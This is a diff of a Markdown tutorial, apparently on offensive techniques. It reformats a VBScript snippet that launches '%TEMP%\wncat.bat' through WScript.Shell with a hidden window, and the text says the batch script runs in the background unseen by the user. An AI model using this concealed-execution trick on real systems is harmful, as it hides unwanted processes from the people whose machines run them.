@@ -85,10 +85,10 @@ We use `-c` to run the script as one-liner from string. We export it onto a batc
 
 <br />
 
-`Dim WinScriptHost<br />
-Set WinScriptHost = CreateObject("WScript.Shell")<br />
-WinScriptHost.Run Chr(34) & "%TEMP%\wncat.bat" & Chr(34), 0<br />
-Set WinScriptHost = Nothing`
+`Dim WinScriptHost`<br />
+`Set WinScriptHost = CreateObject("WScript.Shell")`<br />
+`WinScriptHost.Run Chr(34) & "%TEMP%\wncat.bat" & Chr(34), 0`<br />
+`Set WinScriptHost = Nothing`
 
 The above script, will run our batch script as a separate process on the background without the user ever seeing anything.
 
